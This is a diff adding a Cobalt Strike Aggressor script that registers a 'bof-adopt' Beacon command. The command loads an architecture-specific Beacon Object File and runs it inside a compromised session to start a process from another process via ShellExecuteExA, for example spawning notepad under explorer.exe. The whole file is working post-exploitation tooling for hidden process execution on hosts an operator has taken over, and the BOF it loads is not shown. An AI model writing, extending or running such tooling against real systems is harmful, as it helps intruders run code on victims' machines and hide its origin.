@@ -1,0 +1,31 @@
+alias bof-adopt {
+	local('$barch $handle $data');
+
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("bof-adopt"));
+		return;
+	}
+	
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+	# read in the right BOF file
+	$handle = openf(script_resource("dist/bof-adopt. $+ $barch $+ .o"));    
+	$data   = readb($handle, -1);
+	closef($handle);
+	
+	# pack arguments
+	$args   = bof_pack($1, "zz", $2, $3);
+
+	# announce what we're doing
+	btask($1, "Running Adopt BOF");
+	
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+	"bof-adopt", 
+	"Runs a process from another process using ShellExecuteExA", 
+	"Example:\n\nbof-adopt explorer.exe C:\\windows\\system32\\notepad.exe");
